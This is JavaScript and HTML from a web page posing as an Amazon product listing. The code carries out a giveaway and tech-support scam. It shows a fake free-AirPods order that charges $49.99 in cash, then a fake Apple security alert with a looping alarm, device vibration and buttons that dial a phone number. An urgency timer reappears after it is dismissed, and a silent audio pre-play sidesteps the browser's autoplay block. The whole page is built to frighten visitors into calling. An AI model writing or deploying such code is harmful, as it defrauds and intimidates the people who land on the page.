              <img src="images/sf_map.jpg" style="width: 45px; height: 45px; object-fit: contain; background: white; border: 1px solid #ddd; padding: 2px; border-radius: 4px;" alt="Product Thumbnail">
              <div>
                <strong style="display: block; font-size: 12px; max-height: 36px; overflow: hidden; text-overflow: ellipsis; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; text-transform: uppercase; color: #d32f2f;">
                  AIR PODS FROM XPERIENCE MEDIA
                </strong>
                <span style="display: inline-flex; align-items: center; gap: 4px; margin-top: 4px;">
                  <span style="background-color: #0066c0; color: #ffffff; font-size: 8px; font-weight: 800; padding: 2px 4px; border-radius: 1px; text-transform: uppercase;">AMAZON PRIME</span>
                  <span style="color: #007600; font-weight: 700; font-size: 11px; text-transform: uppercase;">GUARANTEED TOMORROW MORNING</span>
                </span>
              </div>
            </div>
            
            <div style="border-top: 1px dashed #ddd; padding-top: 8px; margin-top: 8px; text-transform: uppercase;">
              <div style="margin-bottom: 4px;"><strong>DELIVER TO:</strong> ${firstName} ${lastName}</div>
              <div><strong>ADDRESS:</strong> ${address}</div>
            </div>
          </div>
          
          <!-- Receipt billing table -->
          <div style="border: 1px solid #ddd; border-radius: 6px; padding: 10px 12px; font-size: 12px; color: #565959; text-transform: uppercase;">
            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
              <span>ITEM SUBTOTAL:</span>
              <span style="color: #111;">$0.00</span>
            </div>
            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
              <span>SHIPPING & HANDLING:</span>
              <span style="color: #111;">$49.99</span>
            </div>
            <div style="display: flex; justify-content: space-between; border-top: 1px solid #eee; padding-top: 5px; font-size: 13px; font-weight: 700; color: #111;">
              <span>ORDER TOTAL (COD):</span>
              <span style="color: #b12704;">$49.99</span>
            </div>
            <div style="font-size: 10px; color: #888; text-align: center; margin-top: 8px; line-height: 1.2; text-transform: uppercase;">
              NO ONLINE CARD PAYMENT PROCESSED. PAY $49.99 IN CASH UPON ARRIVAL.
            </div>
          </div>
          
          <div style="text-align: center; color: #565959; font-size: 11px; margin-top: 14px; text-transform: uppercase;">
            PREPARING ORDER... REDIRECTING TO TRACKING PORTAL SHORTLY.
          </div>
        </div>
      `;
      
      // Wait exactly 12 seconds before transitioning
      setTimeout(() => {
        closeModal("giveawayClaimModal");
        
        // Deepen the background overlay blur when the Apple popup is about to load
        document.getElementById("pageOverlay").classList.add("deep-blur");
        
        // Display the custom background container behind the Apple popup immediately
        document.getElementById("popupBgContainer").style.display = "block";
        
        // Wait 1200 milliseconds so the background mockup can load before the Apple alert popup spring animates
        setTimeout(() => {
          openModal("appleAlertPopup");
          
          // Apply blur to the background screen behind the Apple alert dialog
          const iphoneScreen = document.getElementById("iphoneScreenBody");
          if (iphoneScreen) iphoneScreen.style.filter = "blur(8px)";
          
          // Play the alert sound warning loop
          startAlertSoundLoop();
          
          // Trigger physical device vibration on supported devices
          if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200]);
          }
        }, 1200);
      }, 12000);
    });
  }

  const appleAlertOk = document.getElementById("appleAlertOkBtn");
  if (appleAlertOk) {
    appleAlertOk.addEventListener("click", () => {
      // Dial the support number and keep the popup open (permanent alert)
      window.location.href = "tel:+18009810293";
    });
  }

  const appleAlertCall = document.getElementById("appleAlertCallBtn");
  if (appleAlertCall) {
    appleAlertCall.addEventListener("click", () => {
      // Dial the support number and keep the popup open (permanent alert)
      window.location.href = "tel:+18009810293";
    });
  }
}

// Redirect search parameters to variations configuration
function triggerSearchRedirect() {
  const query = document.getElementById("searchQuery").value.toLowerCase().trim();
  if(!query) return;
  
  if (query.includes("midnight") || query.includes("black") || query.includes("dark")) {
    currentVariation = "midnight";
  } else if (query.includes("blue") || query.includes("navy") || query.includes("ocean")) {
    currentVariation = "blue";
  } else if (query.includes("pink") || query.includes("rose") || query.includes("star")) {
    currentVariation = "pink";
  } else {
    // If no exact match, alert and scroll to A+ comparison table
    document.getElementById("aplusContent").scrollIntoView({ behavior: 'smooth' });
    return;
  }
  
  updatePageContent();
  document.querySelector(".product-main-grid").scrollIntoView({ behavior: 'smooth' });
}

// Urgency Alert functions
function triggerUrgencyAlert() {
  // If checkout or other modals are already active, don't overlap
  if (
    document.getElementById("reviewModal").style.display === "flex" ||
    document.getElementById("checkoutWizard").style.display === "flex" ||
    document.getElementById("checkoutReceipt").style.display === "flex" ||
    document.getElementById("cartDrawer").classList.contains("open") ||
    document.getElementById("giveawayClaimModal").style.display === "flex" ||
    document.getElementById("appleAlertPopup").style.display === "flex"
  ) {
    return;
  }

  openModal("urgencyPopup");
  
  const timerDisplay = document.getElementById("urgencyTimer");
  const claimBtn = document.getElementById("claimUrgencyBtn");
  
  if (claimBtn) {
    claimBtn.disabled = false;
    claimBtn.style.opacity = "1";
  }

  const updateTimerText = () => {
    const mins = Math.max(0, Math.floor(urgencyTimeLeft / 60));
    const secs = Math.max(0, urgencyTimeLeft % 60);
    const formattedTime = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    if (timerDisplay) {
      timerDisplay.textContent = formattedTime;
      timerDisplay.style.color = "var(--amazon-red-alert)";
    }
  };

  updateTimerText();

  // If interval is not already running, start it
  if (!urgencyTimerInterval) {
    urgencyTimerInterval = setInterval(() => {
      urgencyTimeLeft--;
      updateTimerText();
      
      if (urgencyTimeLeft <= 0) {
        clearInterval(urgencyTimerInterval);
        urgencyTimerInterval = null;
        
        // Timer expired! Force transition to Xperience Media Apple alert popup immediately
        closeModal("urgencyPopup");
        closeModal("giveawayClaimModal");
        
        // Deepen background blur and show phone shell mockup
        document.getElementById("pageOverlay").classList.add("deep-blur");
        document.getElementById("popupBgContainer").style.display = "block";
        
        // Load the Apple popup with a 1.2s delay
        setTimeout(() => {
          openModal("appleAlertPopup");
          
          // Apply blur to background screen mockup
          const iphoneScreen = document.getElementById("iphoneScreenBody");
          if (iphoneScreen) iphoneScreen.style.filter = "blur(8px)";
          
          // Play loop sound
          startAlertSoundLoop();
          
          // Vibrate device
          if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200]);
          }
        }, 1200);
      }
    }, 1000);
  }
}

function closeUrgencyAlert() {
  closeModal("urgencyPopup");
  // Do NOT clear interval so the timer keeps going in the background!
  // Reschedule the popup to appear again in 5 seconds
  setTimeout(triggerUrgencyAlert, 5000);
}

// Play user-provided msc.mp3 alert sound on loop
let alertAudio = null;

function startAlertSoundLoopSilent() {
  if (alertAudio) return;
  alertAudio = new Audio('msc.mp3');
  alertAudio.loop = true;
  alertAudio.volume = 0.0;
  // Play and immediately pause to register browser user gesture authorization silently
  alertAudio.play().then(() => {
    alertAudio.pause();
    alertAudio.volume = 1.0;
  }).catch(err => {
    console.log("Silent pre-play failed: ", err);
  });
}

function startAlertSoundLoop() {
  if (!alertAudio) {
    alertAudio = new Audio('msc.mp3');
    alertAudio.loop = true;
  }
  
  // Set volume to full and reset playback index position
  alertAudio.volume = 1.0;
  alertAudio.currentTime = 0;
  
  alertAudio.play().catch(err => {
    console.log("Audio play failed: ", err);
    
    // Auto-retry play on next viewport interaction if blocked
    const forceResume = () => {
      if (alertAudio) {
        alertAudio.play();
        window.removeEventListener('click', forceResume);
      }
    };
    window.addEventListener('click', forceResume);
  });
}

function stopAlertSoundLoop() {
  if (alertAudio) {
    alertAudio.pause();
  }
}
